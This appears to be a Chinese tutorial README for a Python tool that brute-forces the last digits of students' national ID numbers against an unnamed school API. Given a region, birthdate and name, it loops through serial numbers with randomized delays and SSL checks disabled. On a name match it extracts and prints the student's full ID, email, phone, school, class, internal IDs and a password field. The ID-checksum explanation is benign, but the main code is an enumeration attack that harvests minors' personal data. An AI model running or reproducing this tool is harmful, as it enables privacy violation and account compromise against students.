# ST-studentID-Check
**API**
> https://www.***.***/***/***/***/(联系管理员)
## 下载python库
```cmd
pip install requests
```
## 学习CN_ID规则
居民身F证的号码是按照国家的标准编制的，由18位组成：前六位为行政区划代码，第七至第十四位为出生日期码，第15至17位为顺序码，第17位代表性别（奇数为男，偶数为女），第18位为校验码。作为尾号的校验码，是由号码编制单位按统一的公式计算出来的，如果某人的尾号是0-9，都不会出现X，但如果尾号是10，那么就得用X来代替，因为如果用10做尾号，那么此人的身F证就变成了19位，而19位的号码违反了国家标准，并且我国的计算机应用系统也不承认19位的身F证号码。Ⅹ是罗马数字的10，用X来代替10，可以保证公民的身F证符合国家标准
### **详见[CSDN](https://blog.csdn.net/cheney_888/article/details/97321739)**

### (1)十七位数字本体码加权求和公式
>       S = Ai * Wi, i = 2, ... , 18
>       Y = mod(S, 11)
>       i: 表示号码字符从右至左包括校验码字符在内的位置序号
>       Ai:表示第i位置上的身F证号码字符值
>       Wi:表示第i位置上的加权因子
>       i:      18    17    16     15    14    13    12    11    10    9     8     7     6     5    4    3    2    1
>       Wi:    7      9     10      5      8      4      2      1      6     3     7     9    10    5    8    4    2    1
### (2)Y值对应的校验码字符值：
>       Y:            0    1    2    3    4    5    6    7    8    9    10
>       校验码: 1     0    X    9    8    7    6    5    4    3     2
### 试算一个：
#### 身F证号是14010519590215222a1
> i:      18    17    16     15    14    13    12    11    10    9     8     7     6     5    4    3    2    1
> Ai:     1      4      0       1       0     5       1     9      5     9     0     2     1     5    2    2    2    a1
> Wi:    7      9     10      5      8      4      2      1      6     3     7     9    10    5    8    4    2    1
#### 根据公式 
> S = Ai * Wi=7+36+0+5+0+20+2+9+30+27+0+18+10+25+16+8+4=217
> 217/11=19+8/11
> Y = mod(S, 11)=mod(217,11)=8
所以，检验码为4，该人的身F证号为*140105195902152224*
```c++
#include <iostream>
using namespace std;
const int factor[] = { 7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2 };//加权因子 
const int checktable[] = { 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 };//校验值对应表 
int checkIDinput( char[] );
void checkID( int[], char[] );
int main()
{
    char ID[ 19 ];
    int IDNumber[ 19 ];
    cout << "输入身F证号码:";
    cin  >> ID;    
    while( !checkIDinput( ID ) )  //防止输入过程中位数输入错误   
    {
           cout << "错误ID,重新输入:"; 
           cout << "输入身F证号码:";
           cin  >> ID;   
    } 
    for ( int i = 0; i < 18; i ++ )//相当于类型转换
         IDNumber[ i ] = ID[ i ] - 48; 
         
    checkID( IDNumber, ID );
    
    system( "pause" ); 
    return 0;
}
int checkIDinput( char ID[] )//检验身F证是否为18位 
{ 
    if ( strlen( ID ) == 18 )//字符串最后一位/0 
       return 1;
    else return 0;
}
void checkID( int IDNumber[], char ID[] )
{
     int i = 0;//i为计数
     int checksum = 0; 
     for ( ; i < 17; i ++ )
         checksum += IDNumber[ i ] * factor[ i ];
    
     if ( IDNumber[ 17 ] == checktable[ checksum % 11 ] || ( ID[ 17 ] == 'x' && checktable[ checksum % 11 ] == 2 ))       cout << "正确身F证号码/n";
     else cout << "错误身F证号码/n"; 
}
```

### 例如 NULL

## 编码
### 引用库
```Python
import requests
import logging
import random
import time
```
第一个用于发送请求
第二个用于去除warming
第三，四个用于随机时间
### 定义基本函数
#### 取模函数
```Python
def mod(dividend, divisor):
    return dividend % divisor
```
#### 根据前17位计算校验码
```Python
def CN_ID_Compute(ID_1_17):
    i = 17
    S = 0
    while i > 0:
        S = int(S) + int(int(ID_1_17[i - 1]) * int(WI[i - 1]))
        i -= 1
    result_mid = mod(dividend=S, divisor=11)
    i = 10
    while i >= 0:
        if int(Y[i]) == int(result_mid):
            return YX[i]
        i -= 1
```
#### 输入处理基本信息得到前14位
```Python
def input_imfo ():
    CINO_P1_City = "4405"  # City_NUM
    CINO_P2_District = "01"  # District_NUM
    CINO_P3_BirthYear = "2000"  # BirthYear_NUM
    CINO_P4_BirthMonth = "01"  # BirthMonth_NUM
    CINO_P5_BirthDay = "01"  # BirthDay_NUM
    CINO_P6_Serial = "01"  # Serial_NUM
    CINO_P7_Gender = "0"  # Gender_NUM
    CINO_P8_Check = "0"  # Check_NUM
    print("您的身份归属地:(NULL)")
    city_num = input("输入对应数字:")
    if city_num == "1":
        CINO_P2_District = "01"
    elif city_num == "2":
        CINO_P2_District = "07"
    elif city_num == "3":
        CINO_P2_District = "11"
    elif city_num == "4":
        CINO_P2_District = "12"
    elif city_num == "5":
        CINO_P2_District = "13"
    elif city_num == "6":
        CINO_P2_District = "14"
    elif city_num == "7":
        CINO_P2_District = "15"
    elif city_num == "8":
        CINO_P2_District = "23"
    else:
        print("ERROR")
        return False
    CINO_P3_BirthYear = input("输入出身年:")
    if int(CINO_P3_BirthYear) <= 2000 or int(CINO_P3_BirthYear) >= 2020:
        print("ERROR")
        return False
    CINO_P4_BirthMonth = input("输入出身月:")
    if int(CINO_P4_BirthMonth) <= 0 or int(CINO_P4_BirthMonth) > 12:
        print("ERROR")
        return False
    CINO_P5_BirthDay = input("输入出身日:")
    if int(CINO_P5_BirthDay) <= 0 or int(CINO_P5_BirthDay) > 31:
        print("ERROR")
        return False
    China_ID_NUM_OBJ = CINO_P1_City + CINO_P2_District + \
                       CINO_P3_BirthYear + CINO_P4_BirthMonth + \
                       CINO_P5_BirthDay + CINO_P6_Serial + \
                       CINO_P7_Gender + CINO_P8_Check

    return China_ID_NUM_OBJ
```
先初始化变量
然后转换归属地
再得到出生日期
最后整理输出字符串
#### 输入性别并转换为数字
```Python
def input_sex():
    print("输入性别:(0.未知 1.女性 2.男性)")
    sex_num = input("输入对应数字:")
    if sex_num == "0" or sex_num == "1" or sex_num == "2":
        return sex_num
    else:
        return False
```
### 编写主要的函数
#### 定义
```Python
def Last_4_ID_Try(BeTry,Sex,NAME,API,TME):
```
#### 提示信息和信息展示时间
```Python
time.sleep(0.2)
print("Checking...")
time.sleep(0.2)
```
#### 转换字符串为列表
```Python
Try_CNID = list(BeTry)
NAME_list = list(NAME)
```
#### 设置性别相关参数（包括次数，间隔，错误返回）
```Python
    if Sex == 0:
        i = ["0", "0", "0"] # U
        times = 999
        PerPlus = 1
    elif Sex == 1:
        i = ["0", "0", "0"] # W
        times = 499
        PerPlus = 2
    elif Sex == 2:
        i = ["0", "0", "1"] # M
        times = 499
        PerPlus = 2
    else : return 0
```
#### 中间变量
```Python
time_mid = times
```
#### 计算输出等待时间
```Python
    wait_predict_s = times * TME
    wait_predict_m = str(int(wait_predict_s/60))
    print("Need " + wait_predict_m +" min at least.")
    time.sleep(0.7)
```
#### 开始循环TAB
```Python
while times >= 0:
```
#### 输出进度百分比
```Python
print(str(100-(int((times/time_mid)*100))) + "%")
```
#### 随机等待时间并等待
```Python
time_sleep = random.uniform(TME-0.1,TME+0.1)
time.sleep(time_sleep)
```
#### 将Try_CNID列表中的元素连接成一个字符串
```Python
Try_CNIDstr = "".join(Try_CNID)
CNID = Try_CNIDstr
```
#### 消除python报错
```Python
logging.captureWarnings(True)
```
#### 发送请求
```Python
response = requests.get(API + CNID,verify=False)
```
#### 如果返回正确状态码200
```Python
if response.status_code == 200:
```
#### 得到数据
```Python
str_getres = str(response.text)
```
#### 数据断开位置分析
```Python
        position_beg_XXBMS = str_getres.find("\"XXBSM\"")
        position_beg_Class = str_getres.find("级",str_getres.find("\"BJMC\""))
        position_end_Class = str_getres.find("班",position_beg_Class)
        position_beg_XS_JBXX_ID = str_getres.find("\"XS_JBXX_ID\"")
        position_beg_Pass = str_getres.find("Pass")
        position_beg_school = str_getres.find("XXMC")
        position_end_school = str_getres.find("BJMC")
        position_beg_NAME = str_getres.find("XM",position_end_school)
        position_end_NAME = str_getres.find("SFZJH")
        position_beg_ID = position_end_NAME
        position_end_ID = str_getres.find("GRBSM")
        position_beg_email = str_getres.find("Email")
        position_end_email = str_getres.find("MobilePhoneNo")
        position_beg_phonenum = position_end_email + 16
        position_end_phonenum = str_getres.find("\"}")
```
#### 导出数据
```Python
            OBJ_XXBMS = str_getres[position_beg_XXBMS + 9:position_beg_school - 3]
            OBJ_CLASS = str_getres[position_beg_Class + 1:position_end_Class + 1]
            OBJ_XS_JBXX_ID = str_getres[position_beg_XS_JBXX_ID + len("\"XS_JBXX_ID\":\"") : position_beg_NAME - 3]
            OBJ_Pass = str_getres[position_beg_Pass + 7 : position_beg_email - 3]
            OBJ_school = str_getres[position_beg_school + 7:position_end_school - 3]
            OBJ_NAME = str_getres[position_beg_NAME + 5:position_end_NAME - 3]
            OBJ_ID = str_getres[position_beg_ID + 8:position_end_ID - 5]
            OBJ_email = str_getres[position_beg_email + 8:position_end_email - 3]
            OBJ_PHONEnum = str_getres[position_beg_phonenum:position_end_phonenum]
```
#### 姓名相似度数据定义
```Python
            OBJ_NAME_list = list(OBJ_NAME)
            namelength = len(NAME_list)
            mid_FUCK1 = namelength
            OBJ_namelength = len(OBJ_NAME_list)
            trustNUM = False
            similar_Num = 0
```
#### 计算相似度
```Python
            while namelength > 0 and mid_FUCK1 == OBJ_namelength:
                if NAME_list[namelength-1] == OBJ_NAME_list[namelength-1] or OBJ_NAME_list[namelength - 1] == "*":
                    namelength -= 1
                    similar_Num += 1
                    trustNUM = True
                else:
                    trustNUM = False
                    break
```
#### 相似度等于姓名长度时输出数据并结束while循环TAB
```Python
if trustNUM == True and similar_Num == mid_FUCK1:
    print("100%")
    print("***************INFO*********************")
    print("School:" + OBJ_school)
    print("Name:" + NAME)
    print("I D:" + OBJ_ID)
    print("e-mail:" + OBJ_email)
    print("phoneN:" + OBJ_PHONEnum)
    print("class:" + OBJ_CLASS)
    print("SFZJH:" + OBJ_ID + "\\t")
    print("XS_JBXX_ID:" + OBJ_XS_JBXX_ID)
    print("XXBMS:" + OBJ_XXBMS)
    print("Pass:" + OBJ_Pass)
    print("*******************************************")
    return True
```
#### 提前计算下一个数据
```Python
        j = int(i[0]) * 100 + int(i[1]) * 10 + int(i[2])
        Try_CNID[14] = i[0]
        Try_CNID[15] = i[1]
        Try_CNID[16] = i[2]
        Try_CNID[17] = str(CN_ID_Compute(Try_CNID))
        j += PerPlus
        i[0] = str(int((j - (j % 100)) / 100))
        i[1] = str(int(((j % 100) - ((j % 100) % 10)) / 10))
        i[2] = str(int(j % 10))
```
#### 继续while循环
```Python
times -= 1
```
### 定义全局变量
```
I = (18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1)
WI = (7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2, 1)
Y = (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10)
YX = (1, 0, "X", 9, 8, 7, 6, 5, 4, 3, 2)
```
### 编写main函数
```Python
def main():
    kami = input("ENTER PSW:")
    timesw = 0.5
    if kami == "0" or kami == "0":
        API_ = input("PSW RIGHT PLS ENTER API:")
        print("CN ID Check:(if u forget your ID)")
        time.sleep(0.2)
        Last_4_ID_Try(BeTry=input_imfo(), Sex=int(input_sex()), NAME=input("输入你的姓名:"),API=API_,TME=timesw)
        print("查询成功!程序将在30秒后自动关闭.")
        time.sleep(30)
        return 0
    else:
        print("PSW ERROR")
main() 
```
这是基本思路
